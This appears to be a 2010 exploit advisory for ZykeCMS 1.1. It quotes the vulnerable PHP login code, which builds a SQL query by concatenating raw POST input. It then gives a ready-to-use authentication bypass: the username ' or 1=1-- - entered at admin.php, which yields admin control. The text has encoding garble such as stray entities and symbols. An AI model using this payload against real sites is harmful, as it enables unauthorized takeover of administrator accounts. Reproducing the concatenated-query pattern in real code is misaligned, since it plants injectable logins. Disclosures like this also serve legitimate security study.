ZykeCMS V1.1 (Auth Bypass) SQL Injection Vulnerability
======================================================

======================================================
ZykeCMS V1.1 (Auth Bypass) SQL Injection Vulnerability
======================================================
 
Author : Giuseppe &#039;giudinvx&#039; D&#039;Inverno
Email : <giudinvx[at]gmail[dot]com>
Date : 04-16-2010
Site : http://www.giudinvx.altervista.org/
Location : Naples, Italy
 
???????????????????????????????????????????????????????
Application Info:
Site : http://www.zykecms.com/
Version: 1.1
 
???????????????????????????????????????????????????????
[Â·] Vulnerable code in /zykecms/conf/functions.php | /zykecms/admin.php
 
<?php
// admin.php
Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·
if ($_POST[&#039;login&#039;] != "" and $_POST[&#039;password&#039;] != "")
{
if (check_login($_POST[&#039;login&#039;], $_POST[&#039;password&#039;]) == true)
{
if ($_SESSION[&#039;function&#039;] == 1)
header(&#039;Location: admin/&#039;);
else
header(&#039;Location: &#039;);
 
$error_login = "";
}
else
Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·
//functions.php
Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·
function check_login($login, $password)
{
$sql = "SELECT * FROM users WHERE login=&#039;".$login."&#039; AND
password=&#039;".md5($password)."&#039;";
$result = mysql_query($sql);
$num = mysql_num_rows($result);
$data = mysql_fetch_array($result);
// echo $sql;
if ($num == 1)
{
session_start();
$_SESSION[&#039;last_access&#039;]=time();
$_SESSION[&#039;function&#039;]=$data[&#039;function&#039;];
$_SESSION[&#039;login&#039;]=$data[&#039;login&#039;];
$_SESSION[&#039;firstname&#039;]=$data[&#039;firstname&#039;];
$_SESSION[&#039;lastname&#039;]=$data[&#039;lastname&#039;];
$_SESSION[&#039;date&#039;]=$data[&#039;date&#039;];
$_SESSION[&#039;id&#039;]=$data[&#039;id&#039;];
return true;
}
else
return false;
}
Â·Â·Â·Â·Â·Â·Â·Â·Â·
?>
 
???????????????????????????????????????????????????????
[Â·] Exploit
 
Frist of all join login page:
 
http://[target]/[path]/admin.php
 
Username: &#039; or 1=1-- -
Password: 1
 
Now have admin control.



